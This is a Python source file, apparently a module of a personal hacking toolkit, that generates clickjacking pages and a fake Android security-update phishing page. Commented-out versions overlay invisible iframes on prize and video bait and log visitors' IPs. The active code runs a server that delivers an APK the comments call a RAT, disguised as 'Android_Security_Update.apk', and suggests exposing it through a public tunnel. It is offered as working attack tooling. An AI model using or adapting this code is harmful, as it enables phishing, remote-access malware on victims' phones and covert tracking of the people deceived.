# """
# Aadi — Clickjacking PoC Generator Module with Sub-types (Optimized & Secured)
# Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
# """
#
# import os
# from typing import Optional
# from rich.console import Console
# from rich.prompt import Prompt
#
# console = Console()
#
#
# def generate_clickjack_poc(target_url: Optional[str] = None) -> Optional[str]:
#     """
#     Generate Advanced Clickjacking / UI Redressing PoC HTML templates
#     supporting multiple sub-types (Classic, Likejacking, Cursor-Jacking).
#     """
#     console.rule("[bold magenta]🖱️ Advanced Clickjacking PoC Generator[/]")
#
#     if not target_url or not target_url.strip():
#         target_url = Prompt.ask("[cyan]Enter target web URL (e.g., https://example.com/login)[/]")
#         if not target_url.strip():
#             console.print("[bold red]✗ Target URL cannot be empty.[/]")
#             return None
#
#     console.print("\n[bold cyan]Select Clickjacking Attack Sub-Type:[/]")
#     console.print("  [cyan]1.[/] Classic Clickjacking (Invisible Transparent Overlay)")
#     console.print("  [cyan]2.[/] Likejacking (Social Media / Button Trap)")
#     console.print("  [cyan]3.[/] Cursor-Jacking (Fake Cursor Deception)")
#
#     sub_choice = Prompt.ask("Select Option", choices=["1", "2", "3"], default="1")
#
#     output_filename = Prompt.ask("[cyan]Output HTML filename[/]", default="clickjack_poc.html")
#     if not output_filename.endswith(".html"):
#         output_filename += ".html"
#
#     # सब-टाइप के आधार पर HTML टेम्पलेट तैयार करना
#     if sub_choice == "1":
#         # Classic Transparent Overlay PoC
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>AADI - Clickjacking PoC (Classic)</title>
#     <style>
#         html, body {{
#             margin: 0;
#             padding: 0;
#             height: 100%;
#             overflow: hidden;
#             font-family: Arial, sans-serif;
#         }}
#         #bait {{
#             position: absolute;
#             top: 0;
#             left: 0;
#             width: 100%;
#             height: 100%;
#             background: #f4f4f4;
#             display: flex;
#             flex-direction: column;
#             align-items: center;
#             justify-content: center;
#             z-index: 1;
#         }}
#         .btn {{
#             padding: 15px 30px;
#             font-size: 20px;
#             background: #ff4757;
#             color: white;
#             border: none;
#             border-radius: 8px;
#             cursor: pointer;
#             box-shadow: 0 4px 6px rgba(0,0,0,0.2);
#         }}
#         #victim {{
#             position: absolute;
#             top: 0;
#             left: 0;
#             width: 100%;
#             height: 100%;
#             opacity: 0.00; /* Fully Transparent */
#             z-index: 2;
#             border: none;
#         }}
#     </style>
# </head>
# <body>
#     <div id="bait">
#         <h1>🎉 Congratulations! You won a Free iPhone!</h1>
#         <p>Click the button below immediately to claim your prize.</p>
#         <button class="btn">CLAIM PRIZE NOW</button>
#     </div>
#
#     <!-- Target Frame Overlay -->
#     <iframe id="victim" src="{target_url}"></iframe>
# </body>
# </html>
# """
#     elif sub_choice == "2":
#         # Likejacking PoC
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>AADI - Clickjacking PoC (Likejacking)</title>
#     <style>
#         body {{
#             background: #1e1e1e;
#             color: white;
#             font-family: Arial, sans-serif;
#             text-align: center;
#             padding-top: 50px;
#         }}
#         .container {{
#             position: relative;
#             width: 400px;
#             height: 250px;
#             margin: 0 auto;
#             background: #2d2d2d;
#             border-radius: 10px;
#             overflow: hidden;
#             box-shadow: 0 8px 16px rgba(0,0,0,0.5);
#         }}
#         .fake-button {{
#             position: absolute;
#             top: 100px;
#             left: 100px;
#             padding: 12px 25px;
#             background: #2ed573;
#             color: black;
#             font-weight: bold;
#             border-radius: 5px;
#             z-index: 1;
#         }}
#         iframe {{
#             position: absolute;
#             top: 0;
#             left: 0;
#             width: 100%;
#             height: 100%;
#             opacity: 0.01;
#             z-index: 2;
#             cursor: pointer;
#             border: none;
#         }}
#     </style>
# </head>
# <body>
#     <h1>🔥 Watch This Funny Video!</h1>
#     <div class="container">
#         <div class="fake-button">▶ PLAY VIDEO</div>
#         <iframe src="{target_url}"></iframe>
#     </div>
# </body>
# </html>
# """
#     else:
#         # Cursor-Jacking PoC
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>AADI - Clickjacking PoC (Cursor-Jacking)</title>
#     <style>
#         body {{
#             height: 100vh;
#             margin: 0;
#             cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="red" d="M12 2l10 20h-20z"/></svg>'), auto;
#         }}
#         iframe {{
#             width: 100%;
#             height: 100%;
#             border: none;
#             opacity: 0.2; /* Visible for demonstration */
#         }}
#     </style>
# </head>
# <body>
#     <div style="position:fixed; top:10px; left:10px; background:yellow; color:black; padding:5px; z-index:99; font-family:Arial;">
#         ⚠️ Notice: Move your mouse towards the highlighted region.
#     </div>
#     <iframe src="{target_url}"></iframe>
# </body>
# </html>
# """
#
#     try:
#         with open(output_filename, "w", encoding="utf-8") as f:
#             f.write(html_content)
#         console.print(f"\n[bold green]✓ Clickjacking PoC generated successfully:[/] {output_filename}")
#         console.print(f"[dim]Sub-type selected: Option {sub_choice} | Target: {target_url}[/]")
#         return output_filename
#     except Exception as e:
#         console.print(f"[bold red]✗ Failed to write file:[/] {e}")
#         return None


# """
# Aadi — Advanced Clickjacking & Phishing Module with Live Click Tracking
# Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
# """
#
# import os
# import http.server
# import socketserver
# import threading
# from datetime import datetime
# from typing import Optional
# from rich.console import Console
# from rich.panel import Panel
# from rich.prompt import Prompt
# from rich.table import Table
# from rich import box
#
# console = Console()
#
# # Global list to store click logs in memory
# CLICK_LOGS = []
#
#
# class ClickTrackingHandler(http.server.SimpleHTTPRequestHandler):
#     """Custom HTTP handler to serve phishing/clickjack pages and track clicks in real-time."""
#
#     def do_GET(self):
#         client_ip = self.client_address[0]
#         user_agent = self.headers.get("User-Agent", "Unknown")
#         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
#
#         # Log the hit/click
#         log_entry = {
#             "ip": client_ip,
#             "path": self.path,
#             "agent": user_agent,
#             "time": timestamp
#         }
#         CLICK_LOGS.append(log_entry)
#
#         console.print(f"\n[bold green][+] TARGET INTERACTION DETECTED![/]")
#         console.print(f"    [cyan]IP Address:[/] {client_ip}")
#         console.print(f"    [yellow]Timestamp:[/] {timestamp}")
#         console.print(f"    [dim]User-Agent: {user_agent[:60]}...[/]")
#
#         # Serve the generated PoC HTML file
#         if self.path == "/" or self.path == "/index.html":
#             self.path = "/active_clickjack.html"
#
#         return super().do_GET()
#
#     def log_message(self, format, *args):
#         # Suppress default noisy server logs to keep Rich console clean
#         pass
#
#
# def start_tracking_server(html_filename: str, port: int = 8080):
#     """Start local HTTP server to host the PoC and track incoming clicks."""
#     # Ensure the file is named active_clickjack.html for the server to serve it by default
#     if os.path.exists(html_filename):
#         if html_filename != "active_clickjack.html":
#             with open(html_filename, "r", encoding="utf-8") as f:
#                 content = f.read()
#             with open("active_clickjack.html", "w", encoding="utf-8") as f:
#                 f.write(content)
#     else:
#         console.print(f"[bold red]✗ PoC file {html_filename} not found.[/]")
#         return
#
#     console.rule(f"[bold magenta]🎯 AADI Live Click Tracking & Phishing Server[/]")
#     console.print(f"[bold green]✓ Server running at http://127.0.0.1:{port}[/]")
#     console.print(
#         f"[yellow][*] Tip: Use Ngrok or Cloudflared to expose this port (e.g., `cloudflared tunnel --url http://localhost:{port}`)[/]")
#     console.print("[dim]Waiting for target clicks... Press Ctrl+C to stop and view logs.[/]\n")
#
#     try:
#         handler = ClickTrackingHandler
#         with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
#             httpd.serve_forever()
#     except KeyboardInterrupt:
#         console.print("\n[bold yellow][*] Tracking server stopped by user.[/]")
#         show_click_summary()
#     except OSError:
#         console.print(f"[bold red]✗ Port {port} is already in use.[/]")
#
#
# def show_click_summary():
#     """Display summary table of all captured target interactions."""
#     if not CLICK_LOGS:
#         console.print("[yellow]No target clicks recorded in this session.[/]")
#         return
#
#     t = Table(title="[bold cyan]Captured Target Interactions / Clicks[/]", box=box.ROUNDED, border_style="cyan")
#     t.add_column("#", style="cyan", width=4)
#     t.add_column("Target IP", style="bold white")
#     t.add_column("Timestamp", style="yellow")
#     t.add_column("Requested Path", style="green")
#     t.add_column("Device / User-Agent", style="dim")
#
#     for idx, log in enumerate(CLICK_LOGS, 1):
#         t.add_row(str(idx), log["ip"], log["time"], log["path"], log["agent"][:40])
#
#     console.print(t)
#
#
# def generate_clickjack_poc() -> Optional[str]:
#     """Generate Advanced Clickjacking / Phishing PoC templates and offer immediate hosting."""
#     console.rule("[bold magenta]🖱️ Advanced Clickjacking & Phishing PoC Generator[/]")
#
#     target_url = Prompt.ask("[cyan]Enter target URL or Payload Delivery Link (e.g., http://your-c2-server.com)[/]")
#     if not target_url.strip():
#         console.print("[bold red]✗ Target URL cannot be empty.[/]")
#         return None
#
#     console.print("\n[bold cyan]Select Attack / Delivery Sub-Type:[/]")
#     console.print("  [cyan]1.[/] Classic Clickjacking (Invisible Transparent Overlay)")
#     console.print("  [cyan]2.[/] Phishing Login / Update Trap (Button & Intent Trigger)")
#     console.print("  [cyan]3.[/] Likejacking (Social Media / Fake Video Player)")
#
#     sub_choice = Prompt.ask("Select Option", choices=["1", "2", "3"], default="2")
#
#     output_filename = Prompt.ask("[cyan]Output HTML filename[/]", default="clickjack_poc.html")
#     if not output_filename.endswith(".html"):
#         output_filename += ".html"
#
#     if sub_choice == "1":
#         # Classic Transparent Overlay PoC
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>Special Giveaway - Claim Reward</title>
#     <style>
#         html, body {{ margin:0; padding:0; height:100%; overflow:hidden; font-family:sans-serif; }}
#         #bait {{
#             position:absolute; top:0; left:0; width:100%; height:100%; background:#0f172a; color:white;
#             display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:1;
#         }}
#         .btn {{
#             padding:15px 35px; font-size:22px; background:#22c55e; color:white; border:none;
#             border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 4px 15px rgba(34,197,94,0.4);
#         }}
#         #victim {{ position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.00; z-index:2; border:none; }}
#     </style>
# </head>
# <body>
#     <div id="bait">
#         <h1>🎉 Congratulations! You have been selected!</h1>
#         <p>Click below to verify your device and claim your exclusive reward.</p>
#         <button class="btn">CLAIM REWARD NOW</button>
#     </div>
#     <iframe id="victim" src="{target_url}"></iframe>
# </body>
# </html>
# """
#     elif sub_choice == "2":
#         # Phishing / Update Trap with Click Tracking & Intent Trigger
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <meta name="viewport" content="width=device-width, initial-scale=1.0">
#     <title>Android Security Patch & Update</title>
#     <style>
#         body {{ background:#09090b; color:#f4f4f5; font-family:sans-serif; text-align:center; padding:40px 20px; }}
#         .card {{ background:#18181b; border:1px solid #27272a; border-radius:12px; max-width:400px; margin:0 auto; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.8); }}
#         h2 {{ color:#06b6d4; }}
#         .btn {{ background:#0ea5e9; color:white; border:none; padding:14px 24px; font-size:16px; font-weight:bold; border-radius:6px; cursor:pointer; width:100%; margin-top:20px; }}
#         .btn:hover {{ background:#0284c7; }}
#     </style>
# </head>
# <body>
#     <div class="card">
#         <h2>🛡️ Mandatory System Update</h2>
#         <p>A critical security vulnerability patch is required for your Android device.</p>
#         <p style="font-size:13px; color:#a1a1aa;">Tap below to download and install the security certificate.</p>
#         <button class="btn" onclick="triggerPayload()">Download & Install Update</button>
#     </div>
#     <script>
#         function triggerPayload() {{
#             // Click tracking beacon & payload redirect
#             fetch('/click_tracked?action=download_clicked');
#             alert('Initializing secure package installation...');
#             window.location.href = "{target_url}";
#         }}
#     </script>
# </body>
# </html>
# """
#     else:
#         # Likejacking / Video Player PoC
#         html_content = f"""<!DOCTYPE html>
# <html lang="en">
# <head>
#     <meta charset="UTF-8">
#     <title>Viral Video - Watch Now</title>
#     <style>
#         body {{ background:#121212; color:white; font-family:sans-serif; text-align:center; padding-top:40px; }}
#         .container {{ position:relative; width:360px; height:220px; margin:0 auto; background:#222; border-radius:10px; overflow:hidden; }}
#         .fake-play {{ position:absolute; top:85px; left:110px; padding:12px 30px; background:#ef4444; color:white; font-weight:bold; border-radius:5px; z-index:1; }}
#         iframe {{ position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.01; z-index:2; border:none; }}
#     </style>
# </head>
# <body>
#     <h1>🔥 Viral Video Leak 2026</h1>
#     <div class="container">
#         <div class="fake-play">▶ PLAY VIDEO</div>
#         <iframe src="{target_url}"></iframe>
#     </div>
# </body>
# </html>
# """
#
#     try:
#         with open(output_filename, "w", encoding="utf-8") as f:
#             f.write(html_content)
#         console.print(f"\n[bold green]✓ Clickjacking PoC generated:[/] {output_filename}")
#
#         # Option to host immediately with Live Click Tracking
#         if Prompt.ask("[cyan]Would you like to start the Live Click Tracking Server now?[/]", default=True):
#             port = Prompt.ask("[cyan]Enter server port[/]", default="8080")
#             start_tracking_server(output_filename, int(port))
#
#         return output_filename
#     except Exception as e:
#         console.print(f"[bold red]✗ Failed to write file:[/] {e}")
#         return None


"""
Aadi — Advanced Clickjacking & Phishing Module with Auto-Payload Delivery
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import os
import http.server
import socketserver
import threading
from datetime import datetime
from typing import Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich import box

console = Console()

CLICK_LOGS = []


class PayloadDeliveryHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler to serve phishing pages, track clicks, and deliver payload APK."""

    def do_GET(self):
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Handle Payload Download Request
        if self.path == "/download_payload" or self.path.endswith(".apk"):
            apk_path = "payload.apk"  # आपके द्वारा जनरेट किया गया RAT APK
            if os.path.exists(apk_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/vnd.android.package-archive")
                self.send_header("Content-Disposition", 'attachment; filename="Android_Security_Update.apk"')
                self.end_headers()
                with open(apk_path, "rb") as f:
                    self.wfile.write(f.read())

                console.print(f"\n[bold green][+] PAYLOAD DELIVERED SUCCESSFULLY![/]")
                console.print(f"    [cyan]Target IP:[/] {client_ip} | [yellow]Time:[/] {timestamp}")
                return
            else:
                self.send_error(404, "Payload APK not found on server.")
                return

        # Track regular page hits / clicks
        log_entry = {
            "ip": client_ip,
            "path": self.path,
            "agent": user_agent,
            "time": timestamp
        }
        CLICK_LOGS.append(log_entry)

        console.print(f"\n[bold green][+] TARGET INTERACTION DETECTED![/]")
        console.print(f"    [cyan]IP Address:[/] {client_ip}")
        console.print(f"    [yellow]Timestamp:[/] {timestamp}")
        console.print(f"    [dim]User-Agent: {user_agent[:60]}...[/]")

        # Serve the phishing landing page
        if self.path == "/" or self.path == "/index.html":
            self.path = "/active_clickjack.html"

        return super().do_GET()

    def log_message(self, format, *args):
        pass


def start_payload_delivery_server(html_filename: str, port: int = 8080):
    """Start local HTTP server to host the Phishing page and serve the RAT APK."""
    if os.path.exists(html_filename):
        if html_filename != "active_clickjack.html":
            with open(html_filename, "r", encoding="utf-8") as f:
                content = f.read()
            with open("active_clickjack.html", "w", encoding="utf-8") as f:
                f.write(content)
    else:
        console.print(f"[bold red]✗ PoC file {html_filename} not found.[/]")
        return

    # Check if payload APK exists
    if not os.path.exists("payload.apk"):
        console.print(
            "[bold yellow][!] Warning: 'payload.apk' not found in root directory. Make sure to place your RAT APK as 'payload.apk'.[/]")

    console.rule(f"[bold magenta]🎯 AADI Phishing & Auto-Payload Server[/]")
    console.print(f"[bold green]✓ Server running at http://127.0.0.1:{port}[/]")
    console.print(f"[yellow][*] Expose via tunnel:[/] `cloudflared tunnel --url http://localhost:{port}`")
    console.print("[dim]Waiting for target interaction... Press Ctrl+C to stop.[/]\n")

    try:
        handler = PayloadDeliveryHandler
        with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][*] Server stopped by user.[/]")
        show_click_summary()
    except OSError:
        console.print(f"[bold red]✗ Port {port} is already in use.[/]")


def show_click_summary():
    if not CLICK_LOGS:
        console.print("[yellow]No target interactions recorded.[/]")
        return

    t = Table(title="[bold cyan]Captured Target Interactions[/]", box=box.ROUNDED, border_style="cyan")
    t.add_column("#", style="cyan", width=4)
    t.add_column("Target IP", style="bold white")
    t.add_column("Timestamp", style="yellow")
    t.add_column("Action / Path", style="green")

    for idx, log in enumerate(CLICK_LOGS, 1):
        t.add_row(str(idx), log["ip"], log["time"], log["path"])

    console.print(t)


def generate_clickjack_poc() -> Optional[str]:
    """Generate Phishing template integrated with automatic payload downloading."""
    console.rule("[bold magenta]🖱️ Phishing & Auto-Payload PoC Generator[/]")

    console.print(
        "\n[cyan]This will generate a landing page that triggers an automatic APK payload download on click.[/]")
    output_filename = Prompt.ask("[cyan]Output HTML filename[/]", default="phishing_update.html")
    if not output_filename.endswith(".html"):
        output_filename += ".html"

    # HTML Template configured to download payload.apk automatically on button click
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Critical Security Patch</title>
    <style>
        body { background:#09090b; color:#f4f4f5; font-family:sans-serif; text-align:center; padding:50px 20px; }
        .card { background:#18181b; border:1px solid #27272a; border-radius:12px; max-width:400px; margin:0 auto; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.8); }
        h2 { color:#06b6d4; }
        .btn { background:#0ea5e9; color:white; border:none; padding:14px 24px; font-size:16px; font-weight:bold; border-radius:6px; cursor:pointer; width:100%; margin-top:20px; }
        .btn:hover { background:#0284c7; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🛡️ Mandatory System Update</h2>
        <p>A critical security vulnerability patch is required for your Android device.</p>
        <p style="font-size:13px; color:#a1a1aa;">Tap below to download and install the official patch package.</p>
        <button class="btn" onclick="downloadPayload()">Download & Install Update</button>
    </div>
    <script>
        function downloadPayload() {
            // Trigger automatic APK download
            window.location.href = '/download_payload';
        }
    </script>
</body>
</html>
"""

    try:
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        console.print(f"\n[bold green]✓ Phishing Page generated:[/] {output_filename}")

        if Prompt.ask("[cyan]Would you like to start the Phishing & Payload Delivery Server now?[/]", default=True):
            port = Prompt.ask("[cyan]Enter server port[/]", default="8080")
            start_payload_delivery_server(output_filename, int(port))

        return output_filename
    except Exception as e:
        console.print(f"[bold red]✗ Failed to write file:[/] {e}")
        return None